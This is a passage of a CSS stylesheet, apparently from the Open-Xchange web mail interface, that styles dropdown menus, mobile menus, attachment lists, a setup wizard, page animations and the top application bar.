            right: 0;
            bottom: 0;
            left: 0;
            z-index: 10000;
            background-color: rgba(255, 255, 255, 0.01);
            display: none;
        }

        .context-dropdown.dropdown {
            position: fixed;
        }

        .context-dropdown .dropdown-toggle {
            outline: 0;
        }

        .context-dropdown.open {
            display: block;
        }

        .context-dropdown .dropdown-menu {
            position: absolute;
            top: 100px;
            left: 100px;
            z-index: 10001;
        }

        .context-dropdown .dropdown-menu.io-ox-busy {
            min-height: 100px;
        }

        .dropdown-menu:empty,
        .dropdown-menu .divider:first-child,
        .dropdown-menu .divider:last-child,
        .dropdown-menu .divider+.divider {
            display: none;
        }

        .smart-dropdown-container {
            position: fixed;
            width: 100%;
            height: 100%;
            z-index: 100000;
        }

        .smart-dropdown-container ul {
            overflow-y: auto;
            overflow-x: hidden;
        }

        .smart-dropdown-container ul li:first-child.divider {
            display: none;
        }

        .tt-dropdown-menu {
            max-height: 200px;
            overflow-x: hidden;
            overflow-y: auto;
        }

        .smartphone .tt-dropdown-menu {
            max-height: none;
            overflow-x: auto;
            overflow-y: auto;
        }

        @media (max-width: 540px) and (orientation: portrait),
        (max-height: 540px) and (orientation: landscape) {
            .custom-dropdown.dropdown-menu {
                z-index: 65500;
                max-height: 90%;
                min-width: initial;
                overflow-y: auto;
                -webkit-overflow-scrolling: touch;
                position: fixed;
                top: auto;
                bottom: 0;
                left: 0 !important;
                right: 0;
                border-radius: 0;
                border: 0;
                background-color: transparent;
            }

            .custom-dropdown.dropdown-menu .active-app a {
                font-weight: bold;
            }

            .custom-dropdown.dropdown-menu .divider {
                display: none;
                margin: 0;
                height: 5px;
                visibility: hidden;
            }

            .custom-dropdown.dropdown-menu .divider+.divider {
                display: none;
            }

            .custom-dropdown.dropdown-menu .dropdown-header {
                max-width: 100%;
                color: #07b;
                padding: 5px;
                font-size: 14px;
                font-weight: 400;
                line-height: 30px;
            }

            .custom-dropdown.dropdown-menu .dropdown-header.dropdown-description {
                text-transform: none;
                font-size: 12px;
                line-height: 1.42857143;
                color: #999;
            }

            .custom-dropdown.dropdown-menu li {
                background-color: #fff;
                margin: 0 5px;
                text-align: center;
                font-weight: 300;
            }

            .custom-dropdown.dropdown-menu li a,
            .custom-dropdown.dropdown-menu li .custom-dropdown-label {
                padding: 8px 20px;
            }

            .custom-dropdown.dropdown-menu li a[role~="menuitemcheckbox"]:not(.color-flag),
            .custom-dropdown.dropdown-menu li a[role~="menuitemradio"]:not(.color-flag) {
                margin-left: -18px;
            }

            .custom-dropdown.dropdown-menu li .fa {
                line-height: inherit;
            }

            .custom-dropdown.dropdown-menu li .fa:not(.color-flags-no-checkbox .color-label) {
                width: 30px;
            }

            .custom-dropdown.dropdown-menu li:not(.has-dropdown-description),
            .custom-dropdown.dropdown-menu li+.dropdown-description {
                border-bottom: 1px solid #ddd;
            }

            .custom-dropdown.dropdown-menu li:first-child {
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }

            .custom-dropdown.dropdown-menu li:nth-last-child(2) {
                border-bottom-left-radius: 4px;
                border-bottom-right-radius: 4px;
            }

            .custom-dropdown.dropdown-menu li:last-child {
                margin-top: 5px;
                border-radius: 4px;
                font-weight: bold;
            }

            .custom-dropdown.dropdown-menu li:empty {
                padding: 0;
            }

            .custom-dropdown.dropdown-menu li>a,
            .custom-dropdown.dropdown-menu li>span,
            .custom-dropdown.dropdown-menu li .custom-dropdown-label {
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
                -webkit-tap-highlight-color: transparent;
                -webkit-touch-callout: none;
                user-select: none;
                color: #707070;
                line-height: 30px;
                font-size: 18px;
                font-weight: inherit;
                max-width: none !important;
                border-radius: 4px;
            }

            .custom-dropdown.dropdown-menu li>a {
                color: #07b;
            }

            .custom-dropdown.dropdown-menu li>span {
                font-size: 15px;
                font-weight: normal;
            }

            .custom-dropdown.dropdown-menu li .custom-dropdown-label {
                color: #999;
            }

            .custom-dropdown.dropdown-menu .io-ox-action-link:last-child {
                margin: 0;
            }

            .custom-dropdown.dropdown-menu .dropdown-menu li>a:focus:not(.disabled) {
                background-color: initial;
                background-image: none;
                color: initial;
            }

            .custom-dropdown.dropdown-menu .flag-example,
            .custom-dropdown.dropdown-menu .color-example {
                display: inline-block;
                left: 10px;
                width: 10px;
                height: 30px;
                border-width: 0;
                border-radius: 0;
                position: absolute;
            }

            .custom-dropdown.dropdown-menu a:not(.folder-default-color) .color-flags-no-checkbox:not(.color-label) {
                display: inline-block;
                left: 10px;
                width: 10px;
                height: 30px;
                border-width: 0;
                border-radius: 0;
                position: absolute;
                font-size: 0;
            }

            .custom-dropdown.dropdown-menu .instant-preview {
                padding: 3px 20px;
            }

            .custom-dropdown.dropdown-menu .color-black {
                background-color: #333;
            }

            .custom-dropdown.dropdown-menu .color-red {
                background-color: #c00;
            }

            .custom-dropdown.dropdown-menu .color-orange {
                background-color: #f80;
            }

            .custom-dropdown.dropdown-menu .color-lightgreen {
                background-color: #79bb32;
            }

            .custom-dropdown.dropdown-menu .color-green {
                background-color: #198819;
            }

            .custom-dropdown.dropdown-menu .color-lightblue {
                background-color: #04aef4;
            }

            .custom-dropdown.dropdown-menu .color-blue {
                background-color: #07b;
            }

            .custom-dropdown.dropdown-menu .color-purple {
                background-color: #5c3173;
            }

            .custom-dropdown.dropdown-menu .color-pink {
                background-color: #b316ad;
            }

            .custom-dropdown.dropdown-menu .color-gray {
                background-color: #444;
            }

            .custom-dropdown.dropdown-menu.dropdown-menu li>a:hover:not(.disabled),
            .custom-dropdown.dropdown-menu.dropdown-menu li>a:focus:not(.disabled),
            .custom-dropdown.dropdown-menu.dropdown-submenu:hover>a:not(.disabled) {
                text-decoration: none;
                color: inherit;
                background-color: inherit;
                background-image: none;
            }

            .custom-dropdown.dropdown-menu.dropdown-menu li>a:active {
                color: #fff;
                text-decoration: none;
                outline: 0;
                background-color: #f58300;
                background-image: -moz-linear-gradient(top, #f80, #e67a00);
                background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#f80), to(#e67a00));
                background-image: -webkit-linear-gradient(top, #f80, #e67a00);
                background-image: -o-linear-gradient(top, #f80, #e67a00);
                background-image: linear-gradient(to bottom, #f80, #e67a00);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffff8800', endColorstr='#ffe67a00', GradientType=0);
            }

            .android .custom-dropdown.dropdown-menu.dropdown-menu li>a:active {
                color: inherit;
                text-decoration: none;
                outline: 0;
                background: none;
            }

            .ios #io-ox-core {
                transition: -webkit-filter 100ms ease-in;
                -webkit-filter: blur(0);
            }

            .ios #io-ox-core.menu-blur {
                -webkit-filter: blur(5px);
            }
        }

        .autocomplete-item .contact-image {
            margin-right: 14px;
            display: inline-block;
            float: left;
            width: 42px;
            height: 42px;
            background-repeat: no-repeat;
            background-position: center center;
            background-size: cover;
            border-radius: 50%;
        }

        .autocomplete-item .recipient-name {
            font-weight: bold;
        }

        .autocomplete-item .recipient-name,
        .autocomplete-item .email {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .drag-helper {
            position: absolute;
            z-index: 65000;
            width: 300px;
            height: 40px;
            line-height: 40px;
            color: #333;
            background-color: rgba(240, 240, 240, 0.95);
            padding: 0 14px 0 54px;
            border: 1px solid #ccc;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.175);
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .drag-counter {
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            width: 40px;
            text-align: center;
            font-weight: bold;
            color: #fff;
            background-color: #e9f0fa;
        }

        .dndmask {
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .inplace-dropzone {
            margin: 7px;
            border: 2px dashed #ccc;
            background-color: #fff;
            position: relative;
        }

        .inplace-dropzone.abs {
            position: absolute;
            z-index: 1000000;
        }

        .inplace-dropzone .dropzone-caption,
        .inplace-dropzone .dropzone-dragover {
            color: #333;
            font-weight: bold;
            text-align: center;
            padding: 0 24px;
            top: 50%;
            width: 100%;
            margin-top: -10px;
            z-index: 1;
        }

        .inplace-dropzone .dropzone-dragover {
            color: #777;
            font-size: 60px;
            line-height: 80px;
            margin-top: -60px;
            display: none;
        }

        .inplace-dropzone .dropzone-overlay {
            background-color: white;
            opacity: 0.01;
            z-index: 2;
            display: block;
        }

        .inplace-dropzone.dragover {
            border-color: #777;
        }

        .inplace-dropzone.dragover .dropzone-caption {
            color: #aaa;
            margin-top: 20px;
        }

        .inplace-dropzone.dragover .dropzone-dragover {
            display: block;
        }

        .detail-view-app {
            background-color: #eee;
            overflow: auto;
            -webkit-overflow-scrolling: touch;
        }

        .detail-view-app .thread-view-control,
        .detail-view-app .detail-view-container {
            max-width: 100%;
            margin: 0 auto;
        }

        .detail-view-app .thread-view-control .mail-detail-content.simple-mail,
        .detail-view-app .detail-view-container .mail-detail-content.simple-mail {
            max-width: 100%;
        }

        .detail-view-app .detail-view-container {
            height: 100%;
            overflow: visible;
            outline: 0;
        }

        .detail-view-app .detail-view-container>div {
            min-height: 100%;
            background-color: white;
            padding: 20px;
            border: 20px solid transparent;
            background-clip: padding-box;
        }

        .detail-view-app .thread-view-control,
        .detail-view-app .thread-view-list {
            position: static;
            min-height: 100%;
        }

        .wizard-container {
            display: flex;
            z-index: 100003;
        }

        .wizard-step {
            font-size: 14px;
            background-color: white;
            outline: 0;
            z-index: 1000;
            position: absolute;
            width: 400px;
            box-shadow: 0 10px 20px 0 rgba(0, 0, 0, 0.3);
        }

        .wizard-step.center {
            position: static;
            margin: 0 auto;
        }

        .wizard-step.middle {
            position: static;
            align-self: center;
        }

        .wizard-step .wizard-title {
            font-size: 16px;
            font-weight: bold;
            padding: 24px 16px 0 16px;
            margin: 0 32px 0 0;
        }

        .wizard-step .wizard-title:empty {
            display: none;
        }

        .wizard-step .wizard-header {
            position: relative;
        }

        .wizard-step .wizard-close {
            position: absolute;
            width: 40px;
            height: 48px;
            line-height: 48px;
            top: 8px;
            right: 8px;
            outline: 0;
        }

        .wizard-step .wizard-close:focus {
            color: #333;
            background-color: #ccc;
        }

        .wizard-step .wizard-content {
            padding: 24px 16px;
        }

        .wizard-step .wizard-footer {
            padding: 0 16px 16px 16px;
            font-weight: bold;
            text-align: right;
        }

        .wizard-step .wizard-footer:empty {
            display: none;
        }

        .wizard-step .wizard-footer .btn {
            margin-left: 8px;
        }

        .wizard-step .wizard-footer .wizard-step-number {
            text-align: center;
            line-height: 30px;
            font-weight: normal;
            height: 0px;
            display: block;
        }

        .wizard-overlay {
            background-color: rgba(0, 0, 0, 0.15);
            z-index: 100001;
        }

        .wizard-backdrop {
            background-color: rgba(0, 0, 0, 0.15);
            z-index: 100001;
        }

        .wizard-spotlight {
            background-color: rgba(255, 255, 255, 0.01);
            box-shadow: 0 10px 50px 0 rgba(0, 0, 0, 0.4);
            z-index: 100002;
        }

        .smartphone .wizard-container {
            background-color: #f5f5f5;
            z-index: 1000;
            overflow: hidden;
            display: block;
        }

        .smartphone .wizard-navbar {
            position: absolute;
            width: 100%;
            height: 48px;
            border-bottom: 1px solid #ccc;
            background-color: #fff;
            text-align: center;
            line-height: 48px;
            display: table;
            table-layout: fixed;
            -webkit-touch-callout: none;
        }

        .smartphone .wizard-navbar a:active,
        .smartphone .wizard-navbar a:focus {
            opacity: 0.5;
            text-decoration: none;
        }

        .smartphone .wizard-navbar a[disabled] {
            color: #aaa;
            pointer-events: none;
        }

        .smartphone .wizard-title,
        .smartphone .wizard-back,
        .smartphone .wizard-next {
            display: table-cell;
            width: 50%;
            white-space: nowrap;
        }

        .smartphone .wizard-title {
            font-weight: bold;
            text-align: center;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .smartphone .wizard-back {
            text-align: left;
            padding: 0 8px 0 16px;
        }

        .smartphone .wizard-next {
            text-align: right;
            padding: 0 16px 0 8px;
        }

        .smartphone .wizard-pages {
            position: absolute;
            width: 100%;
            top: 49px;
            bottom: 0;
        }

        .smartphone .wizard-animation {
            display: none;
        }

        .smartphone .wizard-step {
            font-size: 16px;
            top: 0;
            left: 0;
            transform: translate3d(0, 0, 0);
            height: 100%;
            width: 100%;
            padding-top: 40px;
            text-align: center;
            overflow: hidden;
            box-shadow: none;
            background-color: transparent;
        }

        .taptrap {
            position: absolute;
            width: 100%;
            height: 100%;
            background: transparent;
            z-index: 100;
        }

        .io-ox-pagecontroller.page {
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
            position: absolute;
            background: #fff;
            width: 100%;
            height: 100%;
            backface-visibility: hidden;
            display: none;
            box-shadow: 0 0 10px 0 #ccc;
        }

        .io-ox-pagecontroller.page.current,
        .io-ox-pagecontroller.page.inmotion {
            display: block;
        }

        .io-ox-pagecontroller.page .content {
            margin: 0 8px;
        }

        .io-ox-core-animation.in,
        .io-ox-core-animation.out {
            animation-duration: 400ms;
            animation-fill-mode: both;
            animation-timing-function: cubic-bezier(0.1, 0.7, 0.1, 1);
            backface-visibility: hidden;
            perspective: 1000;
        }

        .io-ox-core-animation.fade.in {
            opacity: 1;
            animation-timing-function: linear;
            animation-duration: 150ms;
            animation-name: fadeIn;
        }

        .io-ox-core-animation.fade.out {
            opacity: 0;
            animation-timing-function: linear;
            animation-duration: 150ms;
            animation-name: fadeOut;
        }

        .io-ox-core-animation.slideleft.in {
            animation-name: slideLeftIn;
        }

        .io-ox-core-animation.slideleft.out {
            animation-name: slideLeftOut;
        }

        .io-ox-core-animation.slideright.in {
            animation-name: slideRightIn;
        }

        .io-ox-core-animation.slideright.out {
            animation-name: slideRightOut;
        }

        .io-ox-core-animation.slideup.in {
            animation-name: slideUpIn;
        }

        .io-ox-core-animation.slideup.out {
            animation-name: slideUpOut;
        }

        .io-ox-core-animation.slidedown.in {
            animation-name: slideDownIn;
        }

        .io-ox-core-animation.slidedown.out {
            animation-name: slideDownOut;
        }

        .io-ox-core-animation.pop {
            transform-origin: 50% 50%;
        }

        .io-ox-core-animation.pop.in {
            transform: scale(1);
            animation-name: popin;
            animation-duration: 350ms;
            opacity: 1;
        }

        .io-ox-core-animation.pop.out {
            animation-name: fadeOut;
            animation-duration: 100ms;
            opacity: 0;
        }

        @keyframes popin {
            from {
                transform: scale(0.9);
                opacity: 0;
            }

            to {
                transform: scale(1);
                opacity: 1;
            }
        }

        @keyframes popout {
            from {
                transform: scale(1);
                opacity: 1;
            }

            to {
                transform: scale(0.9);
                opacity: 0;
            }
        }

        @keyframes fadeIn {
            0% {
                opacity: 0;
            }

            100% {
                opacity: 1;
            }
        }

        @keyframes fadeOut {
            0% {
                transform: scale(1);
                opacity: 1;
            }

            100% {
                transform: scale(1);
                opacity: 0;
            }
        }

        @keyframes slideLeftIn {
            0% {
                transform: translate3d(100%, 0, 0);
            }

            100% {
                transform: translate3d(0, 0, 0);
            }
        }

        @keyframes slideLeftOut {
            0% {
                transform: translate3d(0, 0, 0);
                opacity: 1;
            }

            100% {
                transform: translate3d(-20%, 0, 0);
                opacity: 0.8;
            }
        }

        @keyframes slideRightIn {
            0% {
                transform: translate3d(-20%, 0, 0);
            }

            100% {
                transform: translate3d(0, 0, 0);
            }
        }

        @keyframes slideRightOut {
            0% {
                transform: translate3d(0, 0, 0);
            }

            100% {
                transform: translate3d(100%, 0, 0);
            }
        }

        @keyframes slideUpIn {
            0% {
                transform: translate3d(0, 100%, 0);
            }

            100% {
                transform: translate3d(0, 0, 0);
            }
        }

        @keyframes slideUpOut {
            0% {
                transform: translate3d(0, 0, 0);
            }

            100% {
                transform: translate3d(0, 100%, 0);
            }
        }

        @keyframes slideDownIn {
            0% {
                transform: translate3d(0, -100%, 0);
            }

            100% {
                transform: translate3d(0, 0, 0);
            }
        }

        @keyframes slideDownOut {
            0% {
                transform: translate3d(0, 0, 0);
            }

            100% {
                transform: translate3d(0, 100%, 0);
            }
        }

        .io-ox-quota-view {
            font-size: 13px;
            line-height: 16px;
            font-weight: 300;
            padding-bottom: 16px;
        }

        .folder-tree .io-ox-quota-view {
            padding: 0 16px 16px 40px;
        }

        .io-ox-quota-view .quota-description {
            display: table;
            width: 100%;
            margin: 3px 0 4px 0;
        }

        .io-ox-quota-view .numbers {
            font-size: 11px;
            font-weight: bold;
        }

        .io-ox-quota-view .progress {
            clear: both;
            margin: 0;
            height: 8px;
            background-color: #ddd;
        }

        .io-ox-core-tk-attachment-list {
            padding: 0;
        }

        .io-ox-core-tk-attachment-list .item {
            position: relative;
            line-height: 1.5em;
            margin-bottom: 2px;
            padding: 4px 2.5em 4px 5px;
            background-color: white;
        }

        .io-ox-core-tk-attachment-list .item.background {
            background-color: #f5f5f5;
        }

        .io-ox-core-tk-attachment-list .item.pointer {
            cursor: pointer;
        }

        .io-ox-core-tk-attachment-list .item div.dropdown {
            overflow: visible;
        }

        .io-ox-core-tk-attachment-list .item div {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .io-ox-core-tk-attachment-list .item>i {
            position: absolute;
            font-size: 20px;
            top: 12px;
            left: 11px;
        }

        .io-ox-core-tk-attachment-list .item .control,
        .io-ox-core-tk-attachment-list .item .remove {
            display: inline-block;
            position: absolute;
            top: 1px;
            right: 1px;
            bottom: 1px;
            width: 2em;
            line-height: 1em;
            cursor: pointer;
        }

        .io-ox-core-tk-attachment-list .item .control.remove,
        .io-ox-core-tk-attachment-list .item .remove.remove {
            background-color: #f5f5f5;
            color: #aaa;
        }

        .io-ox-core-tk-attachment-list .item .control.dropdown,
        .io-ox-core-tk-attachment-list .item .remove.dropdown {
            margin: 0;
        }

        .io-ox-core-tk-attachment-list .item .control .fa,
        .io-ox-core-tk-attachment-list .item .remove .fa {
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            margin-top: -0.5em;
            text-align: center;
        }

        .io-ox-core-tk-attachment-list .item .remove:hover {
            background-color: #a00;
            color: #fff;
            text-decoration: none;
        }

        .io-ox-core-tk-attachment-list .item .group-label {
            display: block;
            font-style: italic;
            margin-right: 1em;
        }

        .io-ox-core-tk-attachment-list .item.signature-remove a {
            color: #800;
        }

        .io-ox-core-tk-attachment-list .item .signature-preview {
            font-style: italic;
            color: #888;
            white-space: normal;
        }

        .io-ox-core-tk-attachment-list .item.upload {
            background-color: #f5f5f5;
            padding-right: 5px;
        }

        .io-ox-core-tk-attachment-list .item.file {
            position: relative;
            height: 3em;
            line-height: 1.5em;
        }

        .io-ox-core-tk-attachment-list .item .filesize {
            color: #aaa;
        }

        .io-ox-core-tk-attachment-list .item .row-1 {
            position: absolute;
            left: 40px;
            right: 30px;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .io-ox-core-tk-attachment-list .item .row-2 {
            position: absolute;
            left: 40px;
            right: 30px;
            top: 23px;
        }

        .io-ox-core-tk-attachment-list .col-md-6:nth-child(odd) {
            margin-left: 0;
        }

        .io-ox-core-tk-attachment-list .io-ox-core-tk-attachment {
            position: relative;
            height: 3em;
            line-height: 1.5em;
            margin-bottom: 2px;
            padding: 4px 2.5em 4px 5px;
            background-color: #f5f5f5;
        }

        .io-ox-core-tk-attachment-list .io-ox-core-tk-attachment>i,
        .io-ox-core-tk-attachment-list .io-ox-core-tk-attachment .remove i {
            position: absolute;
            font-size: 20px;
            top: 12px;
            left: 11px;
        }

        .io-ox-core-tk-attachment-list .io-ox-core-tk-attachment>div {
            position: absolute;
            left: 40px;
            right: 30px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .io-ox-core-tk-attachment-list .io-ox-core-tk-attachment>div.row-2 {
            top: 23px;
        }

        .io-ox-core-tk-attachment-list .io-ox-core-tk-attachment .remove {
            display: inline-block;
            position: absolute;
            top: 1px;
            right: 1px;
            bottom: 1px;
            width: 2em;
            line-height: 1em;
            background-color: #f5f5f5;
            color: #aaa;
            cursor: pointer;
        }

        .io-ox-core-tk-attachment-list .io-ox-core-tk-attachment .remove:hover {
            background-color: #a00;
            color: #fff;
            text-decoration: none;
        }

        .io-ox-core-tk-attachment-list .io-ox-core-tk-attachment .remove i {
            top: 50%;
            left: 0;
            right: 0;
            margin-top: -0.5em;
            text-align: center;
        }

        .hotspot {
            position: absolute;
            width: 8px;
            height: 8px;
            z-index: 100001;
            background-color: #fd057c;
            border-radius: 50%;
        }

        .hotspot:before {
            content: "";
            position: absolute;
            background-color: rgba(253, 5, 124, 0.7);
            width: 120px;
            height: 120px;
            border-radius: 50%;
            border: 1px solid #fd057c;
            -webkit-animation: hotspot-pulsar 2s infinite ease-out;
            animation: hotspot-pulsar 2s infinite ease-out;
            top: -56px;
            left: -56px;
            z-index: -1;
        }

        .hotspot:after {
            content: "";
            position: absolute;
            background-color: rgba(253, 5, 124, 0.7);
            width: 120px;
            height: 120px;
            top: -56px;
            left: -56px;
            border-radius: 50%;
            border: 1px solid #fd057c;
            -webkit-animation: hotspot-pulsar-inner 2s infinite ease-out;
            animation: hotspot-pulsar-inner 2s infinite ease-out;
        }

        @-webkit-keyframes hotspot-pulsar {
            0% {
                opacity: 0.65;
                transform: scale(0.1);
            }

            100% {
                opacity: 0;
                transform: scale(1);
            }
        }

        @keyframes hotspot-pulsar {
            0% {
                opacity: 0.65;
                transform: scale(0.1);
            }

            100% {
                opacity: 0;
                transform: scale(1);
            }
        }

        @-webkit-keyframes hotspot-pulsar-inner {
            0% {
                opacity: 0;
                transform: scale(0.1);
            }

            24%,
            90% {
                opacity: 0;
            }

            25% {
                opacity: 0.65;
                transform: scale(0.1);
            }

            100% {
                opacity: 0;
                transform: scale(1);
            }
        }

        @keyframes hotspot-pulsar-inner {
            0% {
                opacity: 0;
                transform: scale(0.1);
            }

            24%,
            90% {
                opacity: 0;
            }

            25% {
                opacity: 0.65;
                transform: scale(0.1);
            }

            100% {
                opacity: 0;
                transform: scale(1);
            }
        }

        .skip-links.sr-only.sr-only-focusable {
            background-color: transparent;
            outline: 0;
            color: #fff;
            padding: 8px;
            margin: 12px 0px 12px 8px;
        }

        .sr-only {
            color: #000;
            background-color: #fff;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .sr-only-focusable:active,
        .sr-only-focusable:focus {
            position: static;
            width: auto;
            height: auto;
            overflow: visible;
            clip: auto;
            white-space: normal;
        }

        #io-ox-core #io-ox-topbar {
            display: none;
        }

        #io-ox-core #io-ox-screens {
            top: 64px;
        }

        .smartphone #io-ox-core #io-ox-screens {
            top: 50px;
        }

        .smartphone .popover-signout {
            margin-right: 10px;
        }

        .smartphone .popover-signout .popover-content-signout {
            color: #333;
        }

        .smartphone #io-ox-appcontrol #io-ox-launcher>button {
            height: 44px;
            width: 100%;
            padding: 0;
        }

        .smartphone #io-ox-appcontrol #io-ox-launcher>button.launcher-btn {
            padding: 14px;
            width: 50px;
            height: 50px;
        }

        #io-ox-top-logo {
            list-style: none;
            width: auto;
            margin: 0 24px;
            font-size: 0;
            line-height: 63px;
        }

        .smartphone #io-ox-top-logo {
            line-height: 50px;
            margin: 0 10px;
        }

        #io-ox-top-logo img {
            width: 60px;
            max-height: 100%;
            margin-top: -1px;
        }

        .logo-btn {
            padding: 0;
            margin: 0;
            border: 0;
        }

        .logo-btn:focus,
        .logo-btn:hover {
            outline: 0;
            background: rgba(0, 0, 0, 0.3);
        }

        html:not(.smartphone) #io-ox-appcontrol #io-ox-toprightbar #io-ox-launcher .launcher-btn {
            padding: 18px 11px 16px 11px;
        }

        #io-ox-appcontrol {
            position: absolute;
            left: 0;
            right: 0;
            z-index: 12;
            color: #fff;
            height: 64px;
            border-bottom: 1px solid rgba(0, 0, 0, 0.9);
            padding: 0;
            display: flex;
            align-content: center;
        }

        #io-ox-appcontrol .fa-comment {
            padding-bottom: 3px;
        }

        #io-ox-appcontrol .fa-envelope-o {
            padding-bottom: 5px;
        }

        #io-ox-appcontrol .fa-comment-o {
            padding-bottom: 7px;
        }

        #io-ox-appcontrol .fa-calendar,
        #io-ox-appcontrol .fa-address-book-o {
            padding-bottom: 4px;
        }

        .smartphone #io-ox-appcontrol {
            height: 50px;
        }

        #io-ox-appcontrol:before {
            content: "";
            position: absolute;
            left: 0;
            right: 0;
            z-index: -1;
            height: 64px;
            border-bottom: 1px solid rgba(0, 0, 0, 0.9);
            opacity: 0;
        }

        .smartphone #io-ox-appcontrol:before {
            height: 50px;
            border-bottom: 0;
        }

        html.time-dependent #io-ox-appcontrol:before {
            transition: opacity 5s linear;
        }

        #io-ox-appcontrol>div {
            display: block;
        }

        #io-ox-appcontrol .badge {
            background-color: #c80000;
        }

        #io-ox-appcontrol #io-ox-launcher,
        #io-ox-appcontrol #io-ox-quicklaunch {
            flex-shrink: 0;
            align-self: auto;
            min-width: 0;
            min-height: auto;
        }

        #io-ox-appcontrol #io-ox-launcher>button,
        #io-ox-appcontrol #io-ox-quicklaunch>button {
            font-size: 18px;
            color: #fff;
            padding: 2px 16px 2px 16px;
            width: 48px;
            position: relative;
            z-index: 2;
            height: 64px;
            display: inline-block;
            border: 0;
        }

        #io-ox-appcontrol #io-ox-launcher>button svg .fill-c1,
        #io-ox-appcontrol #io-ox-quicklaunch>button svg .fill-c1 {
            fill: #fff;
        }

        .smartphone #io-ox-appcontrol #io-ox-launcher>button.launcher-btn,
        .smartphone #io-ox-appcontrol #io-ox-quicklaunch>button.launcher-btn {
            padding: 12px;
            width: 50px;
            height: 49px;
        }

        #io-ox-appcontrol #io-ox-launcher button,
        #io-ox-appcontrol #io-ox-quicklaunch button {
            outline: 0;
        }

        #io-ox-appcontrol #io-ox-launcher button:hover,
        #io-ox-appcontrol #io-ox-quicklaunch button:hover,
        #io-ox-appcontrol #io-ox-launcher button:focus,
        #io-ox-appcontrol #io-ox-quicklaunch button:focus {
            color: #fff;
        }

        #io-ox-appcontrol #io-ox-quicklaunch>button {
            color: rgba(255, 255, 255, 0.8);
            margin-top: initial;
        }

        #io-ox-appcontrol #io-ox-quicklaunch>button>.lcell>.icon {
            margin-bottom: 2px;
        }

        #io-ox-appcontrol.open #io-ox-launcher>button,
        #io-ox-appcontrol #io-ox-launcher>button:hover,
        #io-ox-appcontrol #io-ox-launcher>button:focus,
        #io-ox-appcontrol #io-ox-quicklaunch>button:hover,
        #io-ox-appcontrol #io-ox-quicklaunch>button:focus {
            background: rgba(0, 0, 0, 0.3);
            outline: 0;
        }

        #io-ox-appcontrol svg.indicator {
            position: absolute;
            z-index: 1;
            top: 18px;
            left: 33px;
        }

        #io-ox-appcontrol svg.indicator circle {
            fill: #eb4400;
        }

        #io-ox-appcontrol #io-ox-quicklaunch {
            flex-shrink: 0;
            min-width: 64px;
            min-height: auto;
        }

        .smartphone #io-ox-appcontrol #io-ox-quicklaunch {
            display: none;
        }

        #io-ox-appcontrol #io-ox-quicklaunch .title {
            visibility: hidden;
            height: 0;
        }

        #io-ox-appcontrol #io-ox-quicklaunch .upsell i {
            color: #ffc107;
            visibility: visible;
            position: absolute;
            z-index: 1;
            top: 32px;
            left: 30px;
            font-size: 14px;
        }

        #io-ox-appcontrol #io-ox-topsearch {
            margin-top: 15px;
            flex-grow: 1;
        }

        #io-ox-appcontrol #io-ox-topsearch .search-box>.form-group {
            margin-bottom: 0;
        }

        #io-ox-appcontrol #io-ox-topsearch .search-field {
            border-radius: 0;
            height: 32px;
        }

        #io-ox-appcontrol #io-ox-topsearch .tokenfield {
            padding-top: 2px;
        }

        #io-ox-appcontrol #io-ox-topsearch .twitter-typeahead .tt-input {
            background-color: transparent;
        }

        #io-ox-appcontrol #io-ox-topsearch .tokenfield-placeholder {
            padding-left: 16px;
        }

        #io-ox-appcontrol #io-ox-topsearch .io-ox-find {
            flex: 1;
            max-width: 350px;
            margin-left: auto;
        }

        #io-ox-appcontrol .io-ox-find:not(.active) .search-field {
            background-color: rgba(255, 255, 255, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        #io-ox-appcontrol .io-ox-find:not(.active) .token-input:-ms-input-placeholder {
            color: #fff !important;
        }

        #io-ox-appcontrol .io-ox-find:not(.active) .tokenfield-placeholder:-ms-input-placeholder {
            color: #fff !important;
        }

        #io-ox-appcontrol .io-ox-find:not(.active) .token-input::placeholder {
            color: #fff;
        }

        #io-ox-appcontrol .io-ox-find:not(.active) .tokenfield-placeholder::placeholder {
            color: #fff;
        }

        #io-ox-appcontrol .io-ox-find:not(.active) .token-input::-webkit-input-placeholder,
        #io-ox-appcontrol .io-ox-find:not(.active) .tokenfield-placeholder::-webkit-input-placeholder,
        #io-ox-appcontrol .io-ox-find:not(.active) .token-input::-ms-input-placeholder,
        #io-ox-appcontrol .io-ox-find:not(.active) .tokenfield-placeholder::-ms-input-placeholder {
            color: #fff;
        }

        #io-ox-appcontrol #io-ox-topleftbar,
        #io-ox-appcontrol #io-ox-topleftbar>ul,
        #io-ox-appcontrol #io-ox-topleftbar>ul>li,
        #io-ox-appcontrol #io-ox-topleftbar>ul>li>a,
        #io-ox-appcontrol #io-ox-toprightbar,
        #io-ox-appcontrol #io-ox-toprightbar>ul,
        #io-ox-appcontrol #io-ox-toprightbar>ul>li,
        #io-ox-appcontrol #io-ox-toprightbar>ul>li>a,
        #io-ox-appcontrol #io-ox-toprightbar>ul>li>button {
            display: inline-flex;
            align-items: center;
            justify-content: flex-end;
            height: 100%;
            margin: 0;
        }

        #io-ox-appcontrol #io-ox-topleftbar,
        #io-ox-appcontrol #io-ox-toprightbar {
            padding-right: 12px;
        }

        .smartphone #io-ox-appcontrol #io-ox-topleftbar,
        .smartphone #io-ox-appcontrol #io-ox-toprightbar {
            padding-right: 0;
        }

        #io-ox-appcontrol #io-ox-topleftbar .launcher>a,
        #io-ox-appcontrol #io-ox-toprightbar .launcher>a,
